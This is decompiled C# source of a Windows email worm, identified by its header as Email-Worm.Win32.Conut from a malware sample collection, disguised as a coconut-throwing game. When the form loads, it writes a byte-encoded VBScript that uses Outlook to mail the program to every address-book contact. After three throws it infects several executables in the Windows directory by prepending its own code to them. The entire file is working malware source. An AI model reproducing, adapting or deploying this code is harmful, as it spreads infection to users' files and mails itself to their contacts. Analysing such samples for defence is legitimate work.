// Decompiled with JetBrains decompiler
// Type: coconut.Form1
// Assembly: coconut, Version=1.0.1289.25246, Culture=neutral, PublicKeyToken=null
// MVID: 74F497AE-8E4C-45C7-B879-11E47B32AF9E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Email-Worm.Win32.Conut-d1aa19599cb536866c32747e33efcd9e6fdf4cf94dc33ebf969fadb44302a36f.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Windows.Forms;

namespace coconut
{
  public class Form1 : Form
  {
    public int throw_turn = 0;
    public int score = 0;
    public Random rand_numb = new Random();
    public string virname = Application.ExecutablePath;
    private Button button1;
    private PictureBox coco;
    private PictureBox cluley;
    private PictureBox redattack;
    private PictureBox cl_coco;
    private PictureBox red_coco;
    private PictureBox ms_coco;
    private Label label1;
    private Label label2;
    private Container components = (Container) null;

    public Form1() => this.InitializeComponent();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ResourceManager resourceManager = new ResourceManager(typeof (Form1));
      this.coco = new PictureBox();
      this.cluley = new PictureBox();
      this.redattack = new PictureBox();
      this.button1 = new Button();
      this.cl_coco = new PictureBox();
      this.red_coco = new PictureBox();
      this.ms_coco = new PictureBox();
      this.label1 = new Label();
      this.label2 = new Label();
      this.SuspendLayout();
      this.coco.BackColor = Color.White;
      this.coco.Image = (Image) resourceManager.GetObject("coco.Image");
      this.coco.Location = new Point(0, 88);
      this.coco.Name = "coco";
      this.coco.Size = new Size(104, 96);
      this.coco.TabIndex = 0;
      this.coco.TabStop = false;
      this.cluley.Image = (Image) resourceManager.GetObject("cluley.Image");
      this.cluley.Location = new Point(352, 176);
      this.cluley.Name = "cluley";
      this.cluley.Size = new Size(80, 104);
      this.cluley.TabIndex = 1;
      this.cluley.TabStop = false;
      this.redattack.Image = (Image) resourceManager.GetObject("redattack.Image");
      this.redattack.Location = new Point(176, 176);
      this.redattack.Name = "redattack";
      this.redattack.Size = new Size(104, 104);
      this.redattack.TabIndex = 2;
      this.redattack.TabStop = false;
      this.button1.BackColor = Color.LightGray;
      this.button1.Location = new Point(208, 40);
      this.button1.Name = "button1";
      this.button1.Size = new Size(168, 48);
      this.button1.TabIndex = 3;
      this.button1.Text = "Throw!";
      this.button1.Click += new EventHandler(this.button1_Click);
      this.cl_coco.BackColor = Color.White;
      this.cl_coco.Image = (Image) resourceManager.GetObject("cl_coco.Image");
      this.cl_coco.Location = new Point(336, 176);
      this.cl_coco.Name = "cl_coco";
      this.cl_coco.Size = new Size(104, 96);
      this.cl_coco.TabIndex = 4;
      this.cl_coco.TabStop = false;
      this.cl_coco.Visible = false;
      this.red_coco.BackColor = Color.White;
      this.red_coco.Image = (Image) resourceManager.GetObject("red_coco.Image");
      this.red_coco.Location = new Point(176, 176);
      this.red_coco.Name = "red_coco";
      this.red_coco.Size = new Size(104, 96);
      this.red_coco.TabIndex = 5;
      this.red_coco.TabStop = false;
      this.red_coco.Visible = false;
      this.ms_coco.BackColor = Color.White;
      this.ms_coco.Image = (Image) resourceManager.GetObject("ms_coco.Image");
      this.ms_coco.Location = new Point(496, 176);
      this.ms_coco.Name = "ms_coco";
      this.ms_coco.Size = new Size(104, 96);
      this.ms_coco.TabIndex = 6;
      this.ms_coco.TabStop = false;
      this.ms_coco.Visible = false;
      this.label1.Location = new Point(136, 144);
      this.label1.Name = "label1";
      this.label1.Size = new Size(184, 24);
      this.label1.TabIndex = 7;
      this.label1.Text = "Frans Devaere aka \"ReDaTtAcK\"";
      this.label2.Location = new Point(352, 144);
      this.label2.Name = "label2";
      this.label2.TabIndex = 8;
      this.label2.Text = "Graham Cluley";
      this.AutoScaleBaseSize = new Size(5, 13);
      this.BackColor = Color.White;
      this.ClientSize = new Size(600, 270);
      this.Controls.AddRange(new Control[9]
      {
        (Control) this.label2,
        (Control) this.label1,
        (Control) this.ms_coco,
        (Control) this.red_coco,
        (Control) this.cl_coco,
        (Control) this.button1,
        (Control) this.redattack,
        (Control) this.cluley,
        (Control) this.coco
      });
      this.Name = nameof (Form1);
      this.Text = "The Coconut Game";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    [STAThread]
    private static void Main() => Application.Run((Form) new Form1());

    private void Form1_Load(object sender, EventArgs e)
    {
      byte[] buffer1 = new byte[685]
      {
        (byte) 79,
        (byte) 110,
        (byte) 32,
        (byte) 69,
        (byte) 114,
        (byte) 114,
        (byte) 111,
        (byte) 114,
        (byte) 32,
        (byte) 82,
        (byte) 101,
        (byte) 115,
        (byte) 117,
        (byte) 109,
        (byte) 101,
        (byte) 32,
        (byte) 78,
        (byte) 101,
        (byte) 120,
        (byte) 116,
        (byte) 13,
        (byte) 10,
        (byte) 68,
        (byte) 105,
        (byte) 109,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 44,
        (byte) 32,
        (byte) 77,
        (byte) 97,
        (byte) 105,
        (byte) 108,
        (byte) 44,
        (byte) 32,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 44,
        (byte) 32,
        (byte) 65,
        (byte) 44,
        (byte) 32,
        (byte) 66,
        (byte) 44,
        (byte) 32,
        (byte) 67,
        (byte) 44,
        (byte) 32,
        (byte) 68,
        (byte) 44,
        (byte) 32,
        (byte) 69,
        (byte) 13,
        (byte) 10,
        (byte) 83,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 67,
        (byte) 114,
        (byte) 101,
        (byte) 97,
        (byte) 116,
        (byte) 101,
        (byte) 79,
        (byte) 98,
        (byte) 106,
        (byte) 101,
        (byte) 99,
        (byte) 116,
        (byte) 32,
        (byte) 40,
        (byte) 34,
        (byte) 111,
        (byte) 117,
        (byte) 116,
        (byte) 108,
        (byte) 111,
        (byte) 111,
        (byte) 107,
        (byte) 46,
        (byte) 97,
        (byte) 112,
        (byte) 112,
        (byte) 108,
        (byte) 105,
        (byte) 99,
        (byte) 97,
        (byte) 116,
        (byte) 105,
        (byte) 111,
        (byte) 110,
        (byte) 34,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 83,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 77,
        (byte) 97,
        (byte) 105,
        (byte) 108,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 46,
        (byte) 71,
        (byte) 101,
        (byte) 116,
        (byte) 78,
        (byte) 97,
        (byte) 109,
        (byte) 101,
        (byte) 83,
        (byte) 112,
        (byte) 97,
        (byte) 99,
        (byte) 101,
        (byte) 32,
        (byte) 40,
        (byte) 34,
        (byte) 77,
        (byte) 65,
        (byte) 80,
        (byte) 73,
        (byte) 34,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 70,
        (byte) 111,
        (byte) 114,
        (byte) 32,
        (byte) 65,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 49,
        (byte) 32,
        (byte) 84,
        (byte) 111,
        (byte) 32,
        (byte) 77,
        (byte) 97,
        (byte) 105,
        (byte) 108,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 114,
        (byte) 101,
        (byte) 115,
        (byte) 115,
        (byte) 76,
        (byte) 105,
        (byte) 115,
        (byte) 116,
        (byte) 115,
        (byte) 46,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 13,
        (byte) 10,
        (byte) 83,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 66,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 77,
        (byte) 97,
        (byte) 105,
        (byte) 108,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 114,
        (byte) 101,
        (byte) 115,
        (byte) 115,
        (byte) 76,
        (byte) 105,
        (byte) 115,
        (byte) 116,
        (byte) 115,
        (byte) 32,
        (byte) 40,
        (byte) 65,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 49,
        (byte) 13,
        (byte) 10,
        (byte) 83,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 67,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 46,
        (byte) 67,
        (byte) 114,
        (byte) 101,
        (byte) 97,
        (byte) 116,
        (byte) 101,
        (byte) 73,
        (byte) 116,
        (byte) 101,
        (byte) 109,
        (byte) 32,
        (byte) 40,
        (byte) 48,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 70,
        (byte) 111,
        (byte) 114,
        (byte) 32,
        (byte) 68,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 49,
        (byte) 32,
        (byte) 84,
        (byte) 111,
        (byte) 32,
        (byte) 66,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 114,
        (byte) 101,
        (byte) 115,
        (byte) 115,
        (byte) 69,
        (byte) 110,
        (byte) 116,
        (byte) 114,
        (byte) 105,
        (byte) 101,
        (byte) 115,
        (byte) 46,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 13,
        (byte) 10,
        (byte) 69,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 66,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 114,
        (byte) 101,
        (byte) 115,
        (byte) 115,
        (byte) 69,
        (byte) 110,
        (byte) 116,
        (byte) 114,
        (byte) 105,
        (byte) 101,
        (byte) 115,
        (byte) 32,
        (byte) 40,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 82,
        (byte) 101,
        (byte) 99,
        (byte) 105,
        (byte) 112,
        (byte) 105,
        (byte) 101,
        (byte) 110,
        (byte) 116,
        (byte) 115,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 32,
        (byte) 69,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 43,
        (byte) 32,
        (byte) 49,
        (byte) 13,
        (byte) 10,
        (byte) 73,
        (byte) 102,
        (byte) 32,
        (byte) 67,
        (byte) 111,
        (byte) 117,
        (byte) 110,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 62,
        (byte) 32,
        (byte) 51,
        (byte) 48,
        (byte) 48,
        (byte) 48,
        (byte) 32,
        (byte) 84,
        (byte) 104,
        (byte) 101,
        (byte) 110,
        (byte) 32,
        (byte) 69,
        (byte) 120,
        (byte) 105,
        (byte) 116,
        (byte) 32,
        (byte) 70,
        (byte) 111,
        (byte) 114,
        (byte) 13,
        (byte) 10,
        (byte) 78,
        (byte) 101,
        (byte) 120,
        (byte) 116,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 83,
        (byte) 117,
        (byte) 98,
        (byte) 106,
        (byte) 101,
        (byte) 99,
        (byte) 116,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 34,
        (byte) 84,
        (byte) 104,
        (byte) 101,
        (byte) 32,
        (byte) 67,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 32,
        (byte) 71,
        (byte) 97,
        (byte) 109,
        (byte) 101,
        (byte) 34,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 66,
        (byte) 111,
        (byte) 100,
        (byte) 121,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 34,
        (byte) 84,
        (byte) 104,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 103,
        (byte) 97,
        (byte) 109,
        (byte) 101,
        (byte) 32,
        (byte) 109,
        (byte) 97,
        (byte) 100,
        (byte) 101,
        (byte) 32,
        (byte) 109,
        (byte) 101,
        (byte) 32,
        (byte) 102,
        (byte) 101,
        (byte) 101,
        (byte) 108,
        (byte) 32,
        (byte) 108,
        (byte) 105,
        (byte) 107,
        (byte) 101,
        (byte) 32,
        (byte) 73,
        (byte) 32,
        (byte) 119,
        (byte) 97,
        (byte) 115,
        (byte) 32,
        (byte) 111,
        (byte) 110,
        (byte) 32,
        (byte) 97,
        (byte) 32,
        (byte) 118,
        (byte) 97,
        (byte) 99,
        (byte) 97,
        (byte) 116,
        (byte) 105,
        (byte) 111,
        (byte) 110,
        (byte) 32,
        (byte) 58,
        (byte) 41,
        (byte) 34,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 65,
        (byte) 116,
        (byte) 116,
        (byte) 97,
        (byte) 99,
        (byte) 104,
        (byte) 109,
        (byte) 101,
        (byte) 110,
        (byte) 116,
        (byte) 115,
        (byte) 46,
        (byte) 65,
        (byte) 100,
        (byte) 100,
        (byte) 32,
        (byte) 34,
        (byte) 99,
        (byte) 58,
        (byte) 92,
        (byte) 99,
        (byte) 111,
        (byte) 99,
        (byte) 111,
        (byte) 110,
        (byte) 117,
        (byte) 116,
        (byte) 46,
        (byte) 101,
        (byte) 120,
        (byte) 101,
        (byte) 34,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 68,
        (byte) 101,
        (byte) 108,
        (byte) 101,
        (byte) 116,
        (byte) 101,
        (byte) 65,
        (byte) 102,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 83,
        (byte) 117,
        (byte) 98,
        (byte) 109,
        (byte) 105,
        (byte) 116,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 84,
        (byte) 114,
        (byte) 117,
        (byte) 101,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 83,
        (byte) 101,
        (byte) 110,
        (byte) 100,
        (byte) 13,
        (byte) 10,
        (byte) 78,
        (byte) 101,
        (byte) 120,
        (byte) 116,
        (byte) 13,
        (byte) 10,
        (byte) 83,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 67,
        (byte) 32,
        (byte) 61,
        (byte) 32,
        (byte) 67,
        (byte) 114,
        (byte) 101,
        (byte) 97,
        (byte) 116,
        (byte) 101,
        (byte) 79,
        (byte) 98,
        (byte) 106,
        (byte) 101,
        (byte) 99,
        (byte) 116,
        (byte) 32,
        (byte) 40,
        (byte) 34,
        (byte) 83,
        (byte) 99,
        (byte) 114,
        (byte) 105,
        (byte) 112,
        (byte) 116,
        (byte) 105,
        (byte) 110,
        (byte) 103,
        (byte) 46,
        (byte) 70,
        (byte) 105,
        (byte) 108,
        (byte) 101,
        (byte) 83,
        (byte) 121,
        (byte) 115,
        (byte) 116,
        (byte) 101,
        (byte) 109,
        (byte) 79,
        (byte) 98,
        (byte) 106,
        (byte) 101,
        (byte) 99,
        (byte) 116,
        (byte) 34,
        (byte) 41,
        (byte) 13,
        (byte) 10,
        (byte) 67,
        (byte) 46,
        (byte) 68,
        (byte) 101,
        (byte) 108,
        (byte) 101,
        (byte) 116,
        (byte) 101,
        (byte) 70,
        (byte) 105,
        (byte) 108,
        (byte) 101,
        (byte) 32,
        (byte) 87,
        (byte) 115,
        (byte) 99,
        (byte) 114,
        (byte) 105,
        (byte) 112,
        (byte) 116,
        (byte) 46,
        (byte) 83,
        (byte) 99,
        (byte) 114,
        (byte) 105,
        (byte) 112,
        (byte) 116,
        (byte) 70,
        (byte) 117,
        (byte) 108,
        (byte) 108,
        (byte) 78,
        (byte) 97,
        (byte) 109,
        (byte) 101
      };
      FileStream fileStream1 = new FileStream("c:\\mail.vbs", FileMode.OpenOrCreate, FileAccess.Write);
      fileStream1.Write(buffer1, 0, buffer1.Length);
      fileStream1.Close();
      if (!File.Exists("c:\\coconut.exe"))
      {
        Process process = new Process();
        File.Copy(this.virname, "c:\\tmpvir.exe", true);
        FileStream fileStream2 = new FileStream("c:\\tmpvir.exe", FileMode.Open);
        FileStream fileStream3 = new FileStream("c:\\coconut.exe", FileMode.OpenOrCreate);
        byte[] buffer2 = new byte[200704];
        fileStream2.Read(buffer2, 0, 200704);
        fileStream3.Write(buffer2, 0, 200704);
        fileStream2.Close();
        fileStream3.Close();
        File.Delete("c:\\tmpvir.exe");
        process.StartInfo.FileName = "c:\\mail.vbs";
        process.Start();
      }
      else
      {
        File.Copy(this.virname, "c:\\tmpvir.exe", true);
        FileStream fileStream4 = new FileStream("c:\\tmpvir.exe", FileMode.Open);
        FileStream fileStream5 = new FileStream("c:\\coconut.exe", FileMode.OpenOrCreate);
        byte[] buffer3 = new byte[200704];
        fileStream4.Read(buffer3, 0, 200704);
        fileStream5.Write(buffer3, 0, 200704);
        fileStream4.Close();
        fileStream5.Close();
        File.Delete("c:\\tmpvir.exe");
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
      int num1 = this.rand_numb.Next(3);
      ++this.throw_turn;
      this.coco.Visible = false;
      switch (num1)
      {
        case 0:
          this.ms_coco.Visible = true;
          int num2 = (int) MessageBox.Show("You missed! You earned 0 points.");
          this.ms_coco.Visible = false;
          break;
        case 1:
          this.red_coco.Visible = true;
          int num3 = (int) MessageBox.Show("You hit Frans Devaere! You earned 1 point.");
          this.red_coco.Visible = false;
          ++this.score;
          break;
        default:
          this.cl_coco.Visible = true;
          int num4 = (int) MessageBox.Show("You hit Graham Cluley! You earned 2 points.");
          this.cl_coco.Visible = false;
          this.score += 2;
          break;
      }
      this.coco.Visible = true;
      if (this.throw_turn != 3)
        return;
      this.FileSearch(new DirectoryInfo(Environment.SystemDirectory).Parent.FullName);
      int num5 = (int) MessageBox.Show("In total, you have " + (object) this.score + " point(s). Therefore, I have infected " + (object) (6 - this.score) + " files on your computer. To be able to run these files, you'll first have to play this game again.\nHave a nice day, \n\nGigabyte [Metaphase VX Team]");
      FileStream fileStream1 = new FileStream(this.virname, FileMode.Open, FileAccess.Read);
      FileStream fileStream2 = new FileStream("temp.exe", FileMode.OpenOrCreate);
      byte[] buffer = new byte[(int) checked ((uint) unchecked ((int) fileStream1.Length - 200704))];
      fileStream1.Seek(200704L, SeekOrigin.Begin);
      fileStream1.Read(buffer, 0, (int) fileStream1.Length - 200704);
      fileStream2.Write(buffer, 0, (int) fileStream1.Length - 200704);
      long length = fileStream2.Length;
      fileStream2.Close();
      if (length > 0L && !this.virname.EndsWith("coconut.exe"))
        new Process() { StartInfo = { FileName = "temp.exe" } }.Start();
      while (File.Exists("temp.exe"))
      {
        try
        {
          File.Delete("temp.exe");
        }
        catch
        {
        }
      }
      Application.Exit();
    }

    private void FileSearch(string DirectoryToCheck)
    {
      string[] files = Directory.GetFiles(DirectoryToCheck, "*.exe");
      int num1 = this.rand_numb.Next(files.Length - 6);
      for (int index = num1; index < num1 + (6 - this.score); ++index)
      {
        string str = files[index];
        FileStream fileStream1 = new FileStream(str, FileMode.Open, FileAccess.Read);
        fileStream1.Seek(18L, SeekOrigin.Begin);
        int num2 = fileStream1.ReadByte();
        fileStream1.Close();
        if (num2 != 103)
        {
          try
          {
            File.SetAttributes(str, FileAttributes.Normal);
            File.Copy(str, "hostcopy.exe", true);
            File.Copy("c:\\coconut.exe", str, true);
            FileStream fileStream2 = new FileStream("hostcopy.exe", FileMode.Open);
            FileStream fileStream3 = new FileStream(str, FileMode.Append);
            byte[] buffer = new byte[(int) checked ((uint) unchecked ((int) fileStream2.Length))];
            fileStream2.Read(buffer, 0, (int) fileStream2.Length);
            fileStream3.Write(buffer, 0, (int) fileStream2.Length);
            fileStream2.Close();
            fileStream3.Close();
          }
          catch
          {
          }
        }
      }
    }
  }
}
